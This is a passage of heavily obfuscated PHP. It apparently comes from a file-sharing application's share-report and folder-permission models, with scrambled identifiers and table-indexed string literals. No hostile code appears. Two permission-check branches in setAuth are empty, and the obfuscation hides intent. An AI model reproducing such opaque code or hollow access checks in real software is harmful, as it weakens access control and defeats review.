$òË°€™– = array($Á¨óÓÖ[460] => array($Á¨óÓÖ[1001], 0), $Á¨óÓÖ[736] => 3); $»ôÍÅŠ = Model($Á¨óÓÖ[1969])->where($òË°€™–)->field($Á¨óÓÖ[460])->select(); if (!$»ôÍÅŠ) { return !1; } $»ôÍÅŠ = array_to_keyvalue($»ôÍÅŠ, $Á¨óÓÖ[12], $Á¨óÓÖ[460]); $»æÜ›Ê¸ = $Á¨óÓÖ[50] . $óæç… . $Á¨óÓÖ[50]; $òË°€™– = array($Á¨óÓÖ[460] => array($Á¨óÓÖ[7], $»ôÍÅŠ), $Á¨óÓÖ[514] => array($Á¨óÓÖ[380], "\x25{$»æÜ›Ê¸}\45"), $Á¨óÓÖ[424] => 0); $¹ø”Äá¦ = Model($Á¨óÓÖ[819])->where($òË°€™–)->field($Á¨óÓÖ[1970])->find(); if (!$¹ø”Äá¦) { return !1; } $…ôãùõÊ = substr($¹ø”Äá¦[$Á¨óÓÖ[514]], strpos($¹ø”Äá¦[$Á¨óÓÖ[514]], $»æÜ›Ê¸)); $òË°€™– = array($Á¨óÓÖ[396] => array($Á¨óÓÖ[7], trim($…ôãùõÊ, $Á¨óÓÖ[50]))); $öæ‘·¸« = Model($Á¨óÓÖ[819])->where($òË°€™–)->field($Á¨óÓÖ[32])->select(); $ëø‹¾Ğ = array_to_keyvalue($öæ‘·¸«, $Á¨óÓÖ[12], $Á¨óÓÖ[32]); $ëø‹¾Ğ[] = $¹ø”Äá¦[$Á¨óÓÖ[32]]; return implode($Á¨óÓÖ[8], $ëø‹¾Ğ); } protected function remove($ã²˜ˆÂŒ) { $ùÚ×Ğ“Õ =& $_SERVER[ê‘³Æ±]; if (is_array($ã²˜ˆÂŒ)) { $ã²˜ˆÂŒ = array($ùÚ×Ğ“Õ[7], $ã²˜ˆÂŒ); } $ÚÃ›®àå = array($ùÚ×Ğ“Õ[481] => $ã²˜ˆÂŒ); $©òªñåá = $this->where($ÚÃ›®àå)->delete(); if ($©òªñåá) { Model($ùÚ×Ğ“Õ[592])->where(array($ùÚ×Ğ“Õ[481] => $ã²˜ˆÂŒ))->delete(); } $Ö§Ø´Õ± = is_array($ã²˜ˆÂŒ) ? $ã²˜ˆÂŒ[1] : array($ã²˜ˆÂŒ); for ($¾ê™üÇã = 0; $¾ê™üÇã < count($Ö§Ø´Õ±); $¾ê™üÇã++) { $¹æ«Ãı = $this->getInfo($Ö§Ø´Õ±[$¾ê™üÇã]); if ($¹æ«Ãı[$ùÚ×Ğ“Õ[488]] == $ùÚ×Ğ“Õ[89]) { Model($ùÚ×Ğ“Õ[560])->eventShare($¹æ«Ãı[$ùÚ×Ğ“Õ[396]], $ùÚ×Ğ“Õ[1959]); } if ($¹æ«Ãı[$ùÚ×Ğ“Õ[486]] == $ùÚ×Ğ“Õ[89]) { Model($ùÚ×Ğ“Õ[560])->eventShare($¹æ«Ãı[$ùÚ×Ğ“Õ[396]], $ùÚ×Ğ“Õ[1958]); } } return $©òªñåá; } protected function removeBySource($…áò÷ûº) { $ç˜µëå¦ =& $_SERVER[ê‘³Æ±]; $ÅÎÍêŒÈ = array($ç˜µëå¦[411] => array($ç˜µëå¦[412], $…áò÷ûº)); $˜«ÉşÒ = $this->field($ç˜µëå¦[481])->where($ÅÎÍêŒÈ)->select(); $˜«ÉşÒ = array_to_keyvalue($˜«ÉşÒ, $ç˜µëå¦[12], $ç˜µëå¦[481]); if (!$˜«ÉşÒ) { return; } $ÅÎÍêŒÈ = array($ç˜µëå¦[480] => array($ç˜µëå¦[412], $˜«ÉşÒ)); $this->where($ÅÎÍêŒÈ)->delete(); Model($ç˜µëå¦[592])->where($ÅÎÍêŒÈ)->delete(); } public function listAll($ğÁš¢ÑÁ) { $äİ¿¢ =& $_SERVER[ê‘³Æ±]; $«¸‡ñóÅ = array(); if ($ğÁš¢ÑÁ[$äİ¿¢[1641]]) { $«¸‡ñóÅ[$äİ¿¢[1641]] = $ğÁš¢ÑÁ[$äİ¿¢[1641]]; } if ($ğÁš¢ÑÁ[$äİ¿¢[747]]) { $·‡‚Ñİ = $ğÁš¢ÑÁ[$äİ¿¢[489]] ? $ğÁš¢ÑÁ[$äİ¿¢[489]] : strtotime(date($äİ¿¢[1971])); $«¸‡ñóÅ[$äİ¿¢[195]] = array($äİ¿¢[330], array($ğÁš¢ÑÁ[$äİ¿¢[747]], $·‡‚Ñİ)); } if ($ğÁš¢ÑÁ[$äİ¿¢[33]]) { $«¸‡ñóÅ[$ğÁš¢ÑÁ[$äİ¿¢[33]]] = 1; } else { $«¸‡ñóÅ[] = array($äİ¿¢[486] => array($äİ¿¢[1001], 0), $äİ¿¢[488] => array($äİ¿¢[1001], 0), $äİ¿¢[1948] => $äİ¿¢[1904]); } if ($ğÁš¢ÑÁ[$äİ¿¢[1900]]) { $«¸‡ñóÅ[] = array($äİ¿¢[483] => $ğÁš¢ÑÁ[$äİ¿¢[1900]], $äİ¿¢[1541] => array($äİ¿¢[380], "\x25{$ğÁš¢ÑÁ[$äİ¿¢[1900]]}\x25"), $äİ¿¢[1948] => $äİ¿¢[1904]); } $¢Õ€ú‹’ = $this->_makeOrder()->where($«¸‡ñóÅ)->selectPage(20); if (empty($¢Õ€ú‹’[$äİ¿¢[366]])) { return array(); } $this->_listDataApply($¢Õ€ú‹’[$äİ¿¢[366]]); return $¢Õ€ú‹’; } public function listDataApply($èÄ–‡ÜÃ) { $this->_listDataApply($èÄ–‡ÜÃ); return $èÄ–‡ÜÃ; } private function _listDataApply(&$½çÄû§) { $Õ÷¸ÕË =& $_SERVER[ê‘³Æ±]; $ü­²’“° = array_to_keyvalue($½çÄû§, $Õ÷¸ÕË[12], $Õ÷¸ÕË[1641]); $Ş¥—«Å = Model($Õ÷¸ÕË[534])->userListInfo(array_unique($ü­²’“°)); $“µ®¿‚§ = array_to_keyvalue($½çÄû§, $Õ÷¸ÕË[12], $Õ÷¸ÕË[396]); $†×â©µ = Model($Õ÷¸ÕË[819])->sourceListInfo($“µ®¿‚§, !0); foreach ($½çÄû§ as $Ì£–‰¤ => &$˜ƒçÛ‰) { $¸¡Õ‘› = $˜ƒçÛ‰[$Õ÷¸ÕË[1641]]; $˜ƒçÛ‰[$Õ÷¸ÕË[1972]] = $Ş¥—«Å[$¸¡Õ‘›] ? $Ş¥—«Å[$¸¡Õ‘›] : !1; $¶Š§¢ÇÆ = $˜ƒçÛ‰[$Õ÷¸ÕË[396]]; $˜ƒçÛ‰[$Õ÷¸ÕË[87]] = $†×â©µ[$¶Š§¢ÇÆ] ? $†×â©µ[$¶Š§¢ÇÆ] : !1; if ($˜ƒçÛ‰[$Õ÷¸ÕË[87]][$Õ÷¸ÕË[424]] == $Õ÷¸ÕË[89]) { unset($½çÄû§[$Ì£–‰¤]); } if ($˜ƒçÛ‰[$Õ÷¸ÕË[87]] != $Õ÷¸ÕË[192] && !$˜ƒçÛ‰[$Õ÷¸ÕË[87]]) { unset($½çÄû§[$Ì£–‰¤]); } } unset($˜ƒçÛ‰); $½çÄû§ = array_values($½çÄû§); } private function _makeOrder($ÃïÈ´ã… = '') { $è€äÂø¶ =& $_SERVER[ê‘³Æ±]; $™³‹“ÇŞ = array($è€äÂø¶[195], $è€äÂø¶[489], $è€äÂø¶[1961], $è€äÂø¶[1962]); $Âüø»± = array($è€äÂø¶[441] => $è€äÂø¶[442], $è€äÂø¶[443] => $è€äÂø¶[444]); $¯øÇ‘Óˆ = Input::get($è€äÂø¶[448], $è€äÂø¶[7], $è€äÂø¶[417], $™³‹“ÇŞ); $èšõ‹ = Input::get($è€äÂø¶[449], $è€äÂø¶[7], $è€äÂø¶[1973], array($è€äÂø¶[1899], $è€äÂø¶[443])); $èšõ‹ = $Âüø»±[$èšõ‹]; $ÃïÈ´ã… = $ÃïÈ´ã… . "{$¯øÇ‘Óˆ}\x20{$èšõ‹}"; return $this->order($ÃïÈ´ã…); } public function reportAdd($ƒáƒ) { $Ï°Âº«ª =& $_SERVER[ê‘³Æ±]; $¾èŞâõø = array($Ï°Âº«ª[481] => $ƒáƒ[$Ï°Âº«ª[481]], $Ï°Âº«ª[1641] => USER_ID); if (Model($Ï°Âº«ª[1969])->where($¾èŞâõø)->find()) { return !1; } $ğ«ÏüÕè = array($Ï°Âº«ª[481] => $ƒáƒ[$Ï°Âº«ª[481]], $Ï°Âº«ª[1541] => $ƒáƒ[$Ï°Âº«ª[1541]], $Ï°Âº«ª[396] => $ƒáƒ[$Ï°Âº«ª[396]], $Ï°Âº«ª[460] => $ƒáƒ[$Ï°Âº«ª[460]], $Ï°Âº«ª[1641] => USER_ID, $Ï°Âº«ª[33] => $ƒáƒ[$Ï°Âº«ª[33]], $Ï°Âº«ª[444] => $ƒáƒ[$Ï°Âº«ª[444]]); return Model($Ï°Âº«ª[1969])->add($ğ«ÏüÕè); } public function reportList($ı€şü´ª) { $óªñîı€ =& $_SERVER[ê‘³Æ±]; $•â€“®¤ = array(); if ($ı€şü´ª[$óªñîı€[747]]) { $®ô¯Ó²ƒ = $ı€şü´ª[$óªñîı€[489]] ? $ı€şü´ª[$óªñîı€[489]] : strtotime(date($óªñîı€[1971])); $•â€“®¤[$óªñîı€[195]] = array($óªñîı€[330], array($ı€şü´ª[$óªñîı€[747]], $®ô¯Ó²ƒ)); } if (isset($ı€şü´ª[$óªñîı€[33]]) && in_array($ı€şü´ª[$óªñîı€[33]], array($óªñîı€[89], $óªñîı€[428], $óªñîı€[1974], $óªñîı€[1975], $óªñîı€[1976]))) { $•â€“®¤[$óªñîı€[33]] = $ı€şü´ª[$óªñîı€[33]]; } if (isset($ı€şü´ª[$óªñîı€[736]]) && in_array($ı€şü´ª[$óªñîı€[736]], array($óªñîı€[192], $óªñîı€[89], $óªñîı€[428], $óªñîı€[1974]))) { $•â€“®¤[$óªñîı€[736]] = $ı€şü´ª[$óªñîı€[736]]; } $Ú§ˆêê = Input::get($óªñîı€[449], $óªñîı€[7], $óªñîı€[1973], array($óªñîı€[1899], $óªñîı€[443])); $£ƒÆ‚µÈ = array($óªñîı€[441] => $óªñîı€[442], $óªñîı€[443] => $óªñîı€[444]); $½óìø™ = $óªñîı€[1977] . $£ƒÆ‚µÈ[$Ú§ˆêê]; $úÜÁÊ¶Ü = Model($óªñîı€[1969])->where($•â€“®¤)->order($½óìø™)->selectPage(20); if (empty($úÜÁÊ¶Ü[$óªñîı€[366]])) { return array(); } $¤¸ëí„ = array_to_keyvalue_group($úÜÁÊ¶Ü[$óªñîı€[366]], $óªñîı€[736], $óªñîı€[481]); if (!empty($¤¸ëí„[0])) { $ı€şü´ª = $¤¸ëí„[0]; $•â€“®¤ = array($óªñîı€[481] => array($óªñîı€[7], $ı€şü´ª)); $«Õı¤‹Ê = $this->where($•â€“®¤)->field($óªñîı€[481])->select(); $«Õı¤‹Ê = array_to_keyvalue($«Õı¤‹Ê, $óªñîı€[12], $óªñîı€[481]); $¾›Ø…·ª = array_diff($ı€şü´ª, $«Õı¤‹Ê); if (!empty($¾›Ø…·ª)) { foreach ($úÜÁÊ¶Ü[$óªñîı€[366]] as $ì·äóç¼ => $ œÚ¼—ş) { if (in_array($ œÚ¼—ş[$óªñîı€[481]], $¾›Ø…·ª)) { unset($úÜÁÊ¶Ü[$óªñîı€[366]][$ì·äóç¼]); } } } } $this->_listDataApply($úÜÁÊ¶Ü[$óªñîı€[366]]); return $úÜÁÊ¶Ü; } public function reportStatus($æ™µû¤¢) { $äŸŸúÌ· =& $_SERVER[ê‘³Æ±]; $™ØÎ£ = array($äŸŸúÌ·[394] => $æ™µû¤¢[$äŸŸúÌ·[394]]); $‡í¤«¤È = Model($äŸŸúÌ·[1969])->where($™ØÎ£)->field($äŸŸúÌ·[1978])->find(); if (!$‡í¤«¤È) { return !1; } $ğ˜ı˜¬È = array($äŸŸúÌ·[736] => $æ™µû¤¢[$äŸŸúÌ·[736]]); if ($æ™µû¤¢[$äŸŸúÌ·[736]] == $äŸŸúÌ·[1974] && $‡í¤«¤È[$äŸŸúÌ·[736]] == $äŸŸúÌ·[1974]) { $ğ˜ı˜¬È[$äŸŸúÌ·[736]] = 0; } $õÍ¯²í = Model($äŸŸúÌ·[1969])->where($™ØÎ£)->save($ğ˜ı˜¬È); if ($æ™µû¤¢[$äŸŸúÌ·[736]] == $äŸŸúÌ·[428]) { if ($‡í¤«¤È[$äŸŸúÌ·[460]] != $äŸŸúÌ·[192] && $this->shareFileMeta($‡í¤«¤È[$äŸŸúÌ·[460]])) { $this->shareFileMeta($‡í¤«¤È[$äŸŸúÌ·[460]], 0); } $this->remove($‡í¤«¤È[$äŸŸúÌ·[481]]); return !0; } if ($õÍ¯²í && $æ™µû¤¢[$äŸŸúÌ·[736]] == $äŸŸúÌ·[1974]) { $˜±¹‚ = $ğ˜ı˜¬È[$äŸŸúÌ·[736]] == $äŸŸúÌ·[1974] ? 1 : 0; $this->shareFileMeta($‡í¤«¤È[$äŸŸúÌ·[460]], $˜±¹‚); $this->removeByFile($‡í¤«¤È[$äŸŸúÌ·[460]]); } return $õÍ¯²í; } private function removeByFile($œ–ßÖşá) { $óïŞŞ—Ì =& $_SERVER[ê‘³Æ±]; $àïíÔ¶Á = Model($óïŞŞ—Ì[819])->where(array($óïŞŞ—Ì[460] => $œ–ßÖşá))->field($óïŞŞ—Ì[396])->select(); $‡úÉµËÈ = array_to_keyvalue($àïíÔ¶Á, $óïŞŞ—Ì[12], $óïŞŞ—Ì[396]); $°ğıÙóÃ = array($óïŞŞ—Ì[396] => array($óïŞŞ—Ì[7], $‡úÉµËÈ), $óïŞŞ—Ì[486] => 1); $àïíÔ¶Á = $this->where($°ğıÙóÃ)->field($óïŞŞ—Ì[481])->select(); if (empty($àïíÔ¶Á)) { return; } $™ä¶¯£ê = array_to_keyvalue($àïíÔ¶Á, $óïŞŞ—Ì[12], $óïŞŞ—Ì[481]); $this->remove($™ä¶¯£ê); } private function shareFileMeta($ğáÔè ƒ, $óæ¦çœ = null) { $ô››ôÂÊ =& $_SERVER[ê‘³Æ±]; $¬ĞÕ°¢÷ = array($ô››ôÂÊ[460] => $ğáÔè ƒ, $ô››ôÂÊ[95] => $ô››ôÂÊ[1979]); if (is_null($óæ¦çœ)) { return Model($ô››ôÂÊ[1980])->where($¬ĞÕ°¢÷)->find(); } $¬ĞÕ°¢÷[$ô››ôÂÊ[371]] = $óæ¦çœ; Model($ô››ôÂÊ[1980])->add($¬ĞÕ°¢÷, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\x75\162\143\145\137\x61\165\164\150"; public function getAuth($…ÑÃÚ±Ù) { $îû·ñÁ =& $_SERVER[ê‘³Æ±]; $ÏÌ†Äô = $this->sourceAuthSelect($…ÑÃÚ±Ù); $ùĞ‰¬¸İ = array(); $ŸÎ«ÑŒ = array(); $é¸©ÔÜ = 2 << 25; foreach ($ÏÌ†Äô as $¾£ŠüÚ) { $×€¦â«È = Model($îû·ñÁ[500])->listData($¾£ŠüÚ[$îû·ñÁ[1910]]); if (!$×€¦â«È) { continue; } $ùĞ‰¬¸İ[] = $¾£ŠüÚ; $¸çî² = 0; if ($¾£ŠüÚ[$îû·ñÁ[405]] == SourceModel::TYPE_GROUP) { $¸çî² = $é¸©ÔÜ * 2; } if ($¾£ŠüÚ[$îû·ñÁ[405]] == SourceModel::TYPE_USER) { $¸çî² = $é¸©ÔÜ; } if ($¾£ŠüÚ[$îû·ñÁ[405]] == SourceModel::TYPE_USER && $¾£ŠüÚ[$îû·ñÁ[498]] == $îû·ñÁ[192]) { $¸çî² = 0; } $ŸÎ«ÑŒ[] = $×€¦â«È[$îû·ñÁ[407]] + $¸çî²; } array_multisort($ŸÎ«ÑŒ, SORT_DESC, $ùĞ‰¬¸İ); return $ùĞ‰¬¸İ; } public function sourceAuthSelect($‡ƒóÈÙõ) { $¥Ã«€À =& $_SERVER[ê‘³Æ±]; static $æë“óì = array(); $Şà§Úöº = is_array($‡ƒóÈÙõ) ? !1 : !0; if ($Şà§Úöº) { $‡ƒóÈÙõ = array($‡ƒóÈÙõ); } $ôÔ¥„‡µ = array(); foreach ($‡ƒóÈÙõ as $Şñîš’Ñ) { if (isset($æë“óì[$Şñîš’Ñ])) { $ôÔ¥„‡µ[$Şñîš’Ñ] = $æë“óì[$Şñîš’Ñ]; } } if (count($ôÔ¥„‡µ) == count($‡ƒóÈÙõ)) { return $Şà§Úöº ? $ôÔ¥„‡µ[$‡ƒóÈÙõ[0]] : $ôÔ¥„‡µ; } $ÊâáêÆ = $¥Ã«€À[1981]; $Òè…©«Ë = array($¥Ã«€À[396] => array($¥Ã«€À[7], $‡ƒóÈÙõ)); $ÂğáÏ± = $this->field($ÊâáêÆ)->order($¥Ã«€À[394])->where($Òè…©«Ë)->select(); $´»¤ŒÒÜ = array_to_keyvalue_group($ÂğáÏ±, $¥Ã«€À[396]); foreach ($‡ƒóÈÙõ as $Şñîš’Ñ) { $æë“óì[$Şñîš’Ñ] = $´»¤ŒÒÜ[$Şñîš’Ñ] ? $´»¤ŒÒÜ[$Şñîš’Ñ] : array(); } if ($Şà§Úöº) { return $ÂğáÏ±; } return $´»¤ŒÒÜ; } public function setAuth($ËÁÙÜ°, $ÛµÜèïŞ) { $¸äÒáª¹ =& $_SERVER[ê‘³Æ±]; $½«İ“»´ = Model($¸äÒáª¹[1314])->sourceInfo($ËÁÙÜ°); if (!$½«İ“»´) { return !1; } if ($½«İ“»´[$¸äÒáª¹[405]] != SourceModel::TYPE_GROUP) { return !1; } $à¡†Ò½ = 1; $æëê””Í = $½«İ“»´[$¸äÒáª¹[498]]; if ($æëê””Í != $à¡†Ò½) { $§±Ğ“úĞ = array($¸äÒáª¹[1809] => $æëê””Í); $‹ÒïÕÕ = Model($¸äÒáª¹[1898])->field($¸äÒáª¹[1641])->where($§±Ğ“úĞ)->select(); $‹ÒïÕÕ = array_to_keyvalue($‹ÒïÕÕ, $¸äÒáª¹[12], $¸äÒáª¹[1641]); } $ŞéÒº±½ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Œ‡‡á¦‹ = array(); foreach ($ÛµÜèïŞ as $…Æ­¬¹´) { if (!in_array($…Æ­¬¹´[$¸äÒáª¹[405]], $ŞéÒº±½)) { show_json(LNG($¸äÒáª¹[1982]), !1); } if ($æëê””Í != $à¡†Ò½) { if ($…Æ­¬¹´[$¸äÒáª¹[405]] == SourceModel::TYPE_GROUP) { } if ($…Æ­¬¹´[$¸äÒáª¹[498]] != 0 && !in_array($…Æ­¬¹´[$¸äÒáª¹[498]], $‹ÒïÕÕ)) { } } if ($…Æ­¬¹´[$¸äÒáª¹[498]] == 0) { $…Æ­¬¹´[$¸äÒáª¹[405]] = SourceModel::TYPE_USER; } $Œ‡‡á¦‹[] = array($¸äÒáª¹[396] => $ËÁÙÜ°, $¸äÒáª¹[405] => intval($…Æ­¬¹´[$¸äÒáª¹[405]]), $¸äÒáª¹[498] => intval($…Æ­¬¹´[$¸äÒáª¹[498]]), $¸äÒáª¹[1910] => intval($…Æ­¬¹´[$¸äÒáª¹[1910]]) ? intval($…Æ­¬¹´[$¸äÒáª¹[1910]]) : 0, $¸äÒáª¹[1964] => intval($…Æ­¬¹´[$¸äÒáª¹[1964]]) ? intval($…Æ­¬¹´[$¸äÒáª¹[1964]]) : -1); } $this->where(array($¸äÒáª¹[411] => $ËÁÙÜ°))->delete(); $this->addAll($Œ‡‡á¦‹); return !0; } public function authClear($·²§…åË) { $…¾ ÒçŠ =& $_SERVER[ê‘³Æ±]; $æØœ—ãÃ = Model($…¾ ÒçŠ[1314])->sourceInfo($·²§…åË); $ŸÄ»´ŒÛ = array($·²§…åË); if ($æØœ—ãÃ[$…¾ ÒçŠ[404]] == $…¾ ÒçŠ[89]) { $¤İäóÂŒ = array($…¾ ÒçŠ[580] => array($…¾ ÒçŠ[540], $æØœ—ãÃ[$…¾ ÒçŠ[514]] . $·²§…åË . $…¾ ÒçŠ[541])); $ŸÄ»´ŒÛ = Model($…¾ ÒçŠ[1314])->field($…¾ ÒçŠ[411])->where($¤İäóÂŒ)->getField($…¾ ÒçŠ[396], !0); $ŸÄ»´ŒÛ[] = $·²§…åË; } $this->where(array($…¾ ÒçŠ[411] => array($…¾ ÒçŠ[412], $ŸÄ»´ŒÛ)))->delete(); return !0; } public function getAllChildren($¨“”·†) { $ÈÇ¸Î =& $_SERVER[ê‘³Æ±]; $íÖĞñÂ¹ = Model($ÈÇ¸Î[1314])->sourceInfo($¨“”·†); if ($íÖĞñÂ¹[$ÈÇ¸Î[404]] != $ÈÇ¸Î[89]) { return $this->sourceListAuth(array($¨“”·†)); } if ($íÖĞñÂ¹[$ÈÇ¸Î[405]] != SourceModel::TYPE_GROUP) { return array(); } $•Ë¦ï–ù = 1; $‘Ì¾Ú˜ = array($¨“”·†); if ($íÖĞñÂ¹[$ÈÇ¸Î[491]] == $ÈÇ¸Î[192] && $íÖĞñÂ¹[$ÈÇ¸Î[498]] != $•Ë¦ï–ù) { $‘Ì¾Ú˜ = $this->groupChidldAllRootSource($íÖĞñÂ¹[$ÈÇ¸Î[498]]); } $·­Ó·¥ = $this->field($ÈÇ¸Î[396])->group($ÈÇ¸Î[396])->select(); $·­Ó·¥ = array_to_keyvalue($·­Ó·¥, $ÈÇ¸Î[12], $ÈÇ¸Î[396]); if (!$·­Ó·¥) { return array(); } $¯ç‹ÆñÂ = $ÈÇ¸Î[1983]; $È©Ğ§°Û = array($ÈÇ¸Î[396] => array($ÈÇ¸Î[7], $·­Ó·¥), $ÈÇ¸Î[424] => $ÈÇ¸Î[192]); $ÂÆ›¨¾Ó = Model($ÈÇ¸Î[819])->field($¯ç‹ÆñÂ)->where($È©Ğ§°Û)->select(); $‹¨ğı¤ã = array($¨“”·†); foreach ($ÂÆ›¨¾Ó as $è¿äŒ¿º) { foreach ($‘Ì¾Ú˜ as $ß’£›Ã¸) { $Ï¶¾—Ç = $ÈÇ¸Î[50] . $ß’£›Ã¸ . $ÈÇ¸Î[50]; $É¾¿Ùœ = $è¿äŒ¿º[$ÈÇ¸Î[514]] . $è¿äŒ¿º[$ÈÇ¸Î[396]] . $ÈÇ¸Î[50]; if (strstr($É¾¿Ùœ, $Ï¶¾—Ç)) { $‹¨ğı¤ã[] = $è¿äŒ¿º[$ÈÇ¸Î[396]]; break; } } } return $this->sourceListAuth($‹¨ğı¤ã); } private function sourceListAuth($šõ¾ü©ô) { $“´Ï‹…¥ =& $_SERVER[ê‘³Æ±]; $±Ë³ÖÁç = Model($“´Ï‹…¥[1314])->sourceListInfo($šõ¾ü©ô, !0); $‡˜êß—ø = $this->sourceAuthSelect($šõ¾ü©ô); $¶°ëÙú° = array(); $ò½Ôµ¼Î = array(); foreach ($±Ë³ÖÁç as $×Ğ¥—“) { unset($×Ğ¥—“[$“´Ï‹…¥[447]]); unset($×Ğ¥—“[$“´Ï‹…¥[445]]); unset($×Ğ¥—“[$“´Ï‹…¥[407]]); unset($×Ğ¥—“[$“´Ï‹…¥[87]]); $ØáÑºÊ› = $‡˜êß—ø[$×Ğ¥—“[$“´Ï‹…¥[396]]]; if (!$ØáÑºÊ›) { continue; } $×Ğ¥—“[$“´Ï‹…¥[1984]] = $this->authTargetInfo($ØáÑºÊ›); $×Ğ¥—“[$“´Ï‹…¥[512]] = rtrim($×Ğ¥—“[$“´Ï‹…¥[518]], $“´Ï‹…¥[8]) . $“´Ï‹…¥[8] . ltrim($×Ğ¥—“[$“´Ï‹…¥[512]], $“´Ï‹…¥[8]); $¶°ëÙú°[] = $×Ğ¥—“; $Û†í·õİ = count(explode($“´Ï‹…¥[8], trim($×Ğ¥—“[$“´Ï‹…¥[512]], $“´Ï‹…¥[8]))); $ò½Ôµ¼Î[] = $Û†í·õİ + ($×Ğ¥—“[$“´Ï‹…¥[33]] == $“´Ï‹…¥[79] ? 0 : 1000); } array_multisort($ò½Ôµ¼Î, SORT_ASC, $¶°ëÙú°); return $¶°ëÙú°; } private function groupChidldAllRootSource($ë¯ÎÀğª) { $¡·ú»Ã× =& $_SERVER[ê‘³Æ±]; $²ÒÏ£İó = Model($¡·ú»Ã×[1985])->groupChildrenAll($ë¯ÎÀğª); $ò€¤œÓÛ = array($¡·ú»Ã×[491] => 0, $¡·ú»Ã×[498] => array($¡·ú»Ã×[7], $²ÒÏ£İó), $¡·ú»Ã×[405] => SourceModel::TYPE_GROUP); $ÄºÄÀ = Model($¡·ú»Ã×[819])->field($¡·ú»Ã×[396])->where($ò€¤œÓÛ)->select(); $ÄºÄÀ = array_to_keyvalue($ÄºÄÀ, $¡·ú»Ã×[12], $¡·ú»Ã×[396]); return $ÄºÄÀ; } private function authTargetInfo($ôÜÄí”°) { $èù¿ÓğÖ =& $_SERVER[ê‘³Æ±]; $ÜÛóÒ¨Ç = array(); $¢çÂ÷‡ = array(); $ªì‰’â— = 2 << 25; foreach ($ôÜÄí”° as $Œ½Óãä) { $¥€©½ö = Model($èù¿ÓğÖ[500])->listData($Œ½Óãä[$èù¿ÓğÖ[1910]]); if (!$¥€©½ö) { continue; } if ($Œ½Óãä[$èù¿ÓğÖ[405]] == SourceModel::TYPE_USER) { $‘®¼ş’ = Model($èù¿ÓğÖ[506])->getInfoSimpleOuter($Œ½Óãä[$èù¿ÓğÖ[498]]); if ($‘®¼ş’[$èù¿ÓğÖ[1641]] == $èù¿ÓğÖ[1177]) { continue; } if ($‘®¼ş’[$èù¿ÓğÖ[1641]] == $èù¿ÓğÖ[192]) { $‘®¼ş’[$èù¿ÓğÖ[32]] = LNG($èù¿ÓğÖ[1986]); } } else { $‘®¼ş’ = Model($èù¿ÓğÖ[515])->getInfoSimple($Œ½Óãä[$èù¿ÓğÖ[498]]); } if (!$‘®¼ş’) { continue; } $‘®¼ş’[$èù¿ÓğÖ[459]] = $¥€©½ö; $ÜÛóÒ¨Ç[] = $‘®¼ş’; $”®Ù·ÕÙ = 0; if ($Œ½Óãä[$èù¿ÓğÖ[405]] == SourceModel::TYPE_GROUP) { $”®Ù·ÕÙ = $ªì‰’â— * 2; } if ($Œ½Óãä[$èù¿ÓğÖ[405]] == SourceModel::TYPE_USER) { $”®Ù·ÕÙ = $ªì‰’â—; } if ($Œ½Óãä[$èù¿ÓğÖ[405]] == SourceModel::TYPE_USER && $Œ½Óãä[$èù¿ÓğÖ[498]] == $èù¿ÓğÖ[192]) { $”®Ù·ÕÙ = 0; } $¢çÂ÷‡[] = $¥€©½ö[$èù¿ÓğÖ[407]] + $”®Ù·ÕÙ; } array_multisort($¢çÂ÷‡, SORT_DESC, $ÜÛóÒ¨Ç); return $ÜÛóÒ¨Ç; } public function getAllChildrenByUser($Ø¡å¯¥€, $Ôâ×£…ˆ) { $éÂĞ¼¡ø =& $_SERVER[ê‘³Æ±]; $ëœÌÜ¾ = Model($éÂĞ¼¡ø[534])->getInfo($Ôâ×£…ˆ); if (!$Ôâ×£…ˆ || !$Ø¡å¯¥€ || !$ëœÌÜ¾) { return array(); } $ªŒ¡—Ö = Model($éÂĞ¼¡ø[1314])->sourceInfo($Ø¡å¯¥€); $ô¨¶‰ªÛ = array(); $ü•¯ïÆì = 1; if ($ªŒ¡—Ö[$éÂĞ¼¡ø[491]] == $éÂĞ¼¡ø[192] && $ªŒ¡—Ö[$éÂĞ¼¡ø[498]] != $ü•¯ïÆì && $this->groupContainUser($ªŒ¡—Ö[$éÂĞ¼¡ø[498]], $Ôâ×£…ˆ)) { foreach ($ëœÌÜ¾[$éÂĞ¼¡ø[1987]] as $ÄŞï±öÇ) { $Ú›Åù½Â = Model($éÂĞ¼¡ø[515])->getInfo($ÄŞï±öÇ[$éÂĞ¼¡ø[1809]]); $£„á¾‘Œ = Model($éÂĞ¼¡ø[534])->getInfoSimpleOuter($Ôâ×£…ˆ); $£„á¾‘Œ[$éÂĞ¼¡ø[459]] = $ÄŞï±öÇ[$éÂĞ¼¡ø[407]]; if (Model($éÂĞ¼¡ø[500])->authCheckAction($ÄŞï±öÇ[$éÂĞ¼¡ø[407]][$éÂĞ¼¡ø[407]], $éÂĞ¼¡ø[1829])) { continue; } $¬ÓúËÅ‹ = array($éÂĞ¼¡ø[32] => $éÂĞ¼¡ø[1590] . $Ú›Åù½Â[$éÂĞ¼¡ø[32]], $éÂĞ¼¡ø[396] => $Ú›Åù½Â[$éÂĞ¼¡ø[87]][$éÂĞ¼¡ø[396]], $éÂĞ¼¡ø[78] => KodIO::make($Ú›Åù½Â[$éÂĞ¼¡ø[87]][$éÂĞ¼¡ø[396]]), $éÂĞ¼¡ø[491] => $éÂĞ¼¡ø[192], $éÂĞ¼¡ø[405] => $éÂĞ¼¡ø[508], $éÂĞ¼¡ø[33] => $éÂĞ¼¡ø[544], $éÂĞ¼¡ø[512] => $Ú›Åù½Â[$éÂĞ¼¡ø[519]], $éÂĞ¼¡ø[1809] => $Ú›Åù½Â[$éÂĞ¼¡ø[1809]], $éÂĞ¼¡ø[516] => $Ú›Åù½Â[$éÂĞ¼¡ø[491]], $éÂĞ¼¡ø[1984] => array($£„á¾‘Œ)); $ô¨¶‰ªÛ[$¬ÓúËÅ‹[$éÂĞ¼¡ø[396]]] = $¬ÓúËÅ‹; } } $Ó´ãÇ±Ñ = array(); $ãÎ‰Êûã = $this->getAllChildren($Ø¡å¯¥€); foreach ($ãÎ‰Êûã as $´øğÊ€™) { $ëŸŠ¬­ = !1; foreach ($´øğÊ€™[$éÂĞ¼¡ø[1984]] as $àœ‹ÊÆš) { if ($àœ‹ÊÆš[$éÂĞ¼¡ø[1641]]) { if ($àœ‹ÊÆš[$éÂĞ¼¡ø[1641]] == $Ôâ×£…ˆ) { $ëŸŠ¬­ = !0; break; } } if 